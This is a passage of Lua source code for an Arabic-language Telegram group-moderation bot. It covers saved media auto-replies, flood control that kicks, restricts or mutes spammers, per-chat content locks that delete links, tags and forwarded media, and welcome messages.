if msg.content_.sticker_ then
DevHmD:set(DevTwix.."HmD:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevHmD:set(DevTwix.."HmD:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevHmD:set(DevTwix.."HmD:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_all_groups = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_all_groups = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_all_groups = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_all_groups = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
DevHmD:set(DevTwix.."HmD:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
DevHmD:set(DevTwix.."HmD:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevHmD:set(DevTwix.."HmD:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم حفظ الرد الجديد', 1, 'md') 
DevHmD:del(DevTwix.."HmD:Add:AllText"..msg.sender_user_id_)
DevHmD:del(DevTwix..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevHmD:get(DevTwix..'HmD:Lock:AllRed'..msg.chat_id_) then
if DevHmD:get(DevTwix.."HmD:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevHmD:get(DevTwix.."HmD:Video:AllRed"..msg.content_.text_))
end
if DevHmD:get(DevTwix.."HmD:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevHmD:get(DevTwix.."HmD:File:AllRed"..msg.content_.text_))
end
if DevHmD:get(DevTwix.."HmD:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevHmD:get(DevTwix.."HmD:Voice:AllRed"..msg.content_.text_))
end
if DevHmD:get(DevTwix.."HmD:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevHmD:get(DevTwix.."HmD:Audio:AllRed"..msg.content_.text_))
end
if DevHmD:get(DevTwix.."HmD:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevHmD:get(DevTwix.."HmD:Photo:AllRed"..msg.content_.text_))
end
if  DevHmD:get(DevTwix.."HmD:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevHmD:get(DevTwix.."HmD:Gif:AllRed"..msg.content_.text_))
end
if DevHmD:get(DevTwix.."HmD:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevHmD:get(DevTwix.."HmD:Stecker:AllRed"..msg.content_.text_))
end
if DevHmD:get(DevTwix.."HmD:Text:AllRed"..msg.content_.text_) then
function DevTwixTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevHmD:get(DevTwix..'HmD:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevHmD:get(DevTwix..'HmD:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevHmD:get(DevTwix.."HmD:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
local Text = Text:gsub('#msgs',(user_msgs or 'لا يوجد'))
local Text = Text:gsub('#stast',(IdRank(msg.sender_user_id_, msg.chat_id_) or 'لا يوجد'))
send(msg.chat_id_,msg.id_,Text)
end
getUser(msg.sender_user_id_, DevTwixTeam)
end
end 
---------------------------------------------------------------------------------------
--       Spam Send        --
function NotSpam(msg,Type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,dp) 
local GetName = '['..dp.first_name_..'](tg://user?id='..dp.id_..')'
if Type == "kick" then 
ChatKick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '⋄︙العضو » '..GetName..' \n⋄︙قام بالتكرار المحدد تم طرده '
SendText(msg.chat_id_,Text,0,'md')
return false  
end 
if Type == "del" then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})   
return false  
end 
if Type == "keed" and not DevHmD:sismember(DevTwix..'HmD:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_.."") 
DevHmD:sadd(DevTwix..'HmD:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '⋄︙العضو » '..GetName..' \n⋄︙قام بالتكرار المحدد تم تقيده '
SendText(msg.chat_id_,Text,0,'md')
return false  
end  
if Type == "mute" and not DevHmD:sismember(DevTwix..'HmD:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevHmD:sadd(DevTwix..'HmD:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '⋄︙العضو » '..GetName..' \n⋄︙قام بالتكرار المحدد تم كتمه '
SendText(msg.chat_id_,Text,0,'md')
return false  
end
end,nil)
end  
--  end functions DevTwix --
---------------------------------------------------------------------------------------
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevHmD:hget(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= DevTwix then
floods = DevHmD:hget(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevHmD:hget(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevHmD:hget(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevHmD:get(DevTwix.."HmD:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevHmD:hget(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevHmD:hget(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevHmD:setex(DevTwix.."HmD:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevHmD:hget(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevHmD:hget(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevHmD:hget(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
if DevHmD:hget(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") then
Time_Spam = DevHmD:hget(DevTwix.."HmD:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") 
end 
end
end 
---------------------------------------------------------------------------------------
----- START MSG CHECKS -----
if msg.sender_user_id_ and Ban(msg.sender_user_id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and BanAll(msg.sender_user_id_) then
ChatKick(msg.chat_id_, msg.sender_user_id_)
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and Muted(msg.sender_user_id_, msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.sender_user_id_ and MuteAll(msg.sender_user_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false
end
if msg.content_.ID == "MessagePinMessage" then
if Constructor(msg) or tonumber(msg.sender_user_id_) == tonumber(DevTwix) then
DevHmD:set(DevTwix..'HmD:PinnedMsg'..msg.chat_id_,msg.content_.message_id_)
else
local pin_id = DevHmD:get(DevTwix..'HmD:PinnedMsg'..msg.chat_id_)
if pin_id and DevHmD:get(DevTwix..'HmD:Lock:Pin'..msg.chat_id_) then
pinmsg(msg.chat_id_,pin_id,0)
end
end
end
if DevHmD:get(DevTwix..'HmD:viewget'..msg.sender_user_id_) then
if not msg.forward_info_ then
DevHmD:del(DevTwix..'HmD:viewget'..msg.sender_user_id_)
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙عدد مشاهدات المنشور هي » ('..msg.views_..')', 1, 'md')
DevHmD:del(DevTwix..'HmD:viewget'..msg.sender_user_id_)
end
end
---------------------------------------------------------------------------------------
--         Photo          --
if msg.content_.ID == "MessagePhoto" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevHmD:get(DevTwix..'HmD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevHmD:get(DevTwix..'HmD:Lock:Photo'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevHmD:get(DevTwix..'HmD:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevHmD:get(DevTwix..'HmD:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevHmD:get(DevTwix..'HmD:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevHmD:get(DevTwix..'HmD:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevHmD:get(DevTwix..'HmD:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevHmD:get(DevTwix..'HmD:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
---------------------------------------------------------------------------------------
--        Markdown        --
elseif not msg.reply_markup_ and msg.via_bot_user_id_ ~= 0 then
if DevHmD:get(DevTwix..'HmD:Lock:Markdown'..msg.chat_id_) then
if not VipMem(msg) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
---------------------------------------------------------------------------------------
--        Document        --
elseif msg.content_.ID == "MessageDocument" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevHmD:get(DevTwix..'HmD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevHmD:get(DevTwix..'HmD:Lock:Document'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevHmD:get(DevTwix..'HmD:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevHmD:get(DevTwix..'HmD:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevHmD:get(DevTwix..'HmD:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevHmD:get(DevTwix..'HmD:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevHmD:get(DevTwix..'HmD:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevHmD:get(DevTwix..'HmD:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
---------------------------------------------------------------------------------------
--         Inline         --
elseif msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" and msg.via_bot_user_id_ ~= 0 then
if not VipMem(msg) then
if DevHmD:get(DevTwix..'HmD:Lock:Inline'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
---------------------------------------------------------------------------------------
--        Sticker         --
elseif msg.content_.ID == "MessageSticker" then
if not VipMem(msg) then
if DevHmD:get(DevTwix..'HmD:Lock:Stickers'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
elseif msg.content_.ID == "MessageChatJoinByLink" then
if DevHmD:get(DevTwix..'HmD:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
function get_welcome(extra,result,success)
if DevHmD:get(DevTwix..'HmD:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevHmD:get(DevTwix..'HmD:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..result.first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..result.username_..']' or '[@DevTwix]'))
Dev_HmD(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end 
if DevHmD:get(DevTwix.."HmD:Lock:Welcome"..msg.chat_id_) then
getUser(msg.sender_user_id_,get_welcome)
end
---------------------------------------------------------------------------------------
--      New User Add      --
elseif msg.content_.ID == "MessageChatAddMembers" then
if not DevHmD:get(DevTwix..'HmD:Lock:BotWelcome') then 
tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = DevTwix,offset_ = 0,limit_ = 1},function(extra,HmD,success) 
for i=0,#msg.content_.members_ do    
BotWelcome = msg.content_.members_[i].id_    
if BotWelcome and BotWelcome == tonumber(DevTwix) then 
if DevHmD:sismember(DevTwix..'HmD:Groups',msg.chat_id_) then BotText = "مفعله في السابق\n⋄︙ارسل » الاوامر واستمتع بالمميزيات" else BotText = "معطله يجب رفعي مشرف\n⋄︙بعد ذلك يرجى ارسال امر » تفعيل\n⋄︙سيتم رفع الادمنيه والمنشئ تلقائيا" end 
if DevHmD:get(DevTwix.."HmD:Text:BotWelcome") then HmDText = DevHmD:get(DevTwix.."HmD:Text:BotWelcome") else HmDText = "⋄︙مرحبا انا بوت اسمي "..NameBot.."\n⋄︙حالة المجموعه » "..BotText.."\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••" end 
if DevHmD:get(DevTwix.."HmD:Photo:BotWelcome") then HmDPhoto = DevHmD:get(DevTwix.."HmD:Photo:BotWelcome") elseif HmD.photos_[0] then HmDPhoto = HmD.photos_[0].sizes_[1].photo_.persistent_id_ else HmDPhoto = nil end 
if HmDPhoto ~= nil then
sendPhoto(msg.chat_id_,msg.id_,0,1,nil,HmDPhoto,HmDText)
else 
send(msg.chat_id_,msg.id_,HmDText)
end 
end   
end
end,nil)
end
if DevHmD:get(DevTwix..'HmD:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban(msg.content_.members_[0].id_, msg.chat_id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and BanAll(msg.content_.members_[0].id_) then
ChatKick(msg.chat_id_, msg.content_.members_[0].id_)
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
if DevHmD:get(DevTwix.."HmD:Lock:Welcome"..msg.chat_id_) then
if DevHmD:get(DevTwix..'HmD:Groups:Welcomes'..msg.chat_id_) then
Welcomes = DevHmD:get(DevTwix..'HmD:Groups:Welcomes'..msg.chat_id_)
else
Welcomes = '• نورت حبي \n• firstname \n• username'
end
local Welcomes = Welcomes:gsub('"',"") Welcomes = Welcomes:gsub("'","") Welcomes = Welcomes:gsub(",","") Welcomes = Welcomes:gsub("*","") Welcomes = Welcomes:gsub(";","") Welcomes = Welcomes:gsub("`","") Welcomes = Welcomes:gsub("{","") Welcomes = Welcomes:gsub("}","") 
local Welcomes = Welcomes:gsub('firstname',('['..msg.content_.members_[0].first_name_..']' or ''))
local Welcomes = Welcomes:gsub('username',('[@'..msg.content_.members_[0].username_..']' or '[@DevTwix]'))
Dev_HmD(msg.chat_id_, msg.id_, 1, Welcomes, 1, 'md')
end
---------------------------------------------------------------------------------------
--        Contact         --
elseif msg.content_.ID == "MessageContact" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevHmD:get(DevTwix..'HmD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevHmD:get(DevTwix..'HmD:Lock:Contact'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
---------------------------------------------------------------------------------------
--         Audio          --
elseif msg.content_.ID == "MessageAudio" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevHmD:get(DevTwix..'HmD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevHmD:get(DevTwix..'HmD:Lock:Music'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevHmD:get(DevTwix..'HmD:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevHmD:get(DevTwix..'HmD:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevHmD:get(DevTwix..'HmD:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevHmD:get(DevTwix..'HmD:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevHmD:get(DevTwix..'HmD:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevHmD:get(DevTwix..'HmD:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
---------------------------------------------------------------------------------------
--         Voice          --
elseif msg.content_.ID == "MessageVoice" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevHmD:get(DevTwix..'HmD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevHmD:get(DevTwix..'HmD:Lock:Voice'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevHmD:get(DevTwix..'HmD:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevHmD:get(DevTwix..'HmD:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevHmD:get(DevTwix..'HmD:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevHmD:get(DevTwix..'HmD:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevHmD:get(DevTwix..'HmD:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevHmD:get(DevTwix..'HmD:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
---------------------------------------------------------------------------------------
--        Location        --
elseif msg.content_.ID == "MessageLocation" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevHmD:get(DevTwix..'HmD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
if DevHmD:get(DevTwix..'HmD:Lock:Location'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return
end
if msg.content_.caption_ then
Filters(msg, msg.content_.caption_)
if DevHmD:get(DevTwix..'HmD:Lock:Links'..msg.chat_id_) then
if msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or msg.content_.caption_:match("[Tt].[Mm][Ee]") or msg.content_.caption_:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if DevHmD:get(DevTwix..'HmD:Lock:Tags'..msg.chat_id_) then
if msg.content_.caption_:match("@") then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("#") then
if DevHmD:get(DevTwix..'HmD:Lock:Hashtak'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[Hh][Tt][Tt][Pp][Ss]://") or msg.content_.caption_:match("[Hh][Tt][Tt][Pp]://") or msg.content_.caption_:match(".[Ii][Rr]") or msg.content_.caption_:match(".[Cc][Oo][Mm]") or msg.content_.caption_:match(".[Oo][Rr][Gg]") or msg.content_.caption_:match(".[Ii][Nn][Ff][Oo]") or msg.content_.caption_:match("[Ww][Ww][Ww].") or msg.content_.caption_:match(".[Xx][Yy][Zz]") or msg.content_.caption_:match(".[Tt][Kk]") or msg.content_.ID == "MessageEntityTextUrl" or msg.content_.ID == "MessageEntityUrl" then
if DevHmD:get(DevTwix..'HmD:Lock:WebLinks'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[\216-\219][\128-\191]") then
if DevHmD:get(DevTwix..'HmD:Lock:Arabic'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
if msg.content_.caption_:match("[A-Z]") or msg.content_.caption_:match("[a-z]") then
if DevHmD:get(DevTwix..'HmD:Lock:English'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
end
---------------------------------------------------------------------------------------
--         Video          --
elseif msg.content_.ID == "MessageVideo" then
if not VipMem(msg) then
if msg.forward_info_ then
if DevHmD:get(DevTwix..'HmD:Lock:Forwards'..msg.chat_id_) then
if msg.forward_info_.ID == "MessageForwardedFromUser" or msg.forward_info_.ID == "MessageForwardedPost" then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
end
end
end
